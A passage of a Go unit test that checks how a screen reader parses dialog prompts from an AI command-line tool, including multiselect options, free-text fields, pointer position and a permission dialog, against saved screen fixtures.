		{"2.1.286-ask-wizard-multi-free-up", "multiselect", "1. Sugar | 2. Milk | 3. Honey | 4. Chat about this", 0, freeField{3, "Honey", false, true}, 2},
		{"2.1.286-ask-wizard-multi-free-back", "multiselect", "1. Sugar | 2. Milk | 3. Honey | 4. Chat about this", 0, freeField{3, "Honey", false, true}, 1},
		{"2.1.286-ask-wizard-multi-free-untick", "multiselect", "1. Sugar | 2. Milk | 3. Honey | 4. Chat about this", 0, freeField{3, "Honey", false, false}, 2},
		// No free-text option: previews, a permission, the Submit tab.
		{"2.1.286-ask-preview", "select", "1. Stacked | 2. Row", 0, freeField{}, 1},
		{"2.1.286-permission-bash", "permission", "1. Yes | 2. Yes, and always allow access to /tmp/lab | 3. No", 0, freeField{}, 1},
		{"2.1.286-ask-wizard-submit", "select", "1. Submit answers | 2. Cancel", 0, freeField{}, 1},
	}
	for _, tt := range tests {
		t.Run(tt.screen, func(t *testing.T) {
			p := readScreen(t, tt.screen).prompt
			if p == nil {
				t.Fatal("no dialog")
			}
			got := 0
			if p.FreeText != nil {
				got = p.FreeText.Index
				if label := p.FreeText.Label; label != "Type something." && label != "Type something" {
					t.Errorf("label = %q", label)
				}
			}
			if p.Kind != tt.kind || labels(p) != tt.options || got != tt.freeText || p.free != tt.free || p.pointer != tt.pointer {
				t.Errorf("got kind=%q options=%q freeText=%d free=%+v pointer=%d", p.Kind, labels(p), got, p.free, p.pointer)
			}
		})
	}
	// Text that wraps or holds a pasted newline is read row by row.
	if p := readScreen(t, "2.1.286-ask-free-multiline").prompt; p == nil || !strings.Contains(p.free.value, "phoneX line two") || p.free.empty {
		t.Errorf("multiline = %+v", p)
	}
	// After Enter on typed text the question is gone.
	if sc := readScreen(t, "2.1.286-ask-free-after-enter"); sc.prompt != nil || sc.input != inputEmpty {
		t.Errorf("after enter = %+v", sc)
	}
	// "Type something." typed as the answer is drawn solid: not the
	// placeholder.
	typed := strings.Replace(fixtureText(t, "2.1.286-ask-free-typed"), "Purple please", "Type something.", 1)
	if p := readClaudeScreen(typed).prompt; p == nil || p.free.empty || p.free.value != "Type something." {
		t.Errorf("typed placeholder = %+v", p)
	}
	// A multiSelect tab with the pointer below the free-text option (on
	// "Chat about this") is not typed into: the pointer only moves down.
	chat := strings.Replace(strings.Replace(fixtureText(t, "2.1.286-ask-wizard-multi-open"), "❯", " ", 1), "  4. Chat about this", "❯ 4. Chat about this", 1)
	if p := readClaudeScreen(chat).prompt; p == nil || p.Kind != "multiselect" || p.pointer != 4 || p.FreeText != nil {
		t.Errorf("pointer on chat = %+v", p)
	}
}
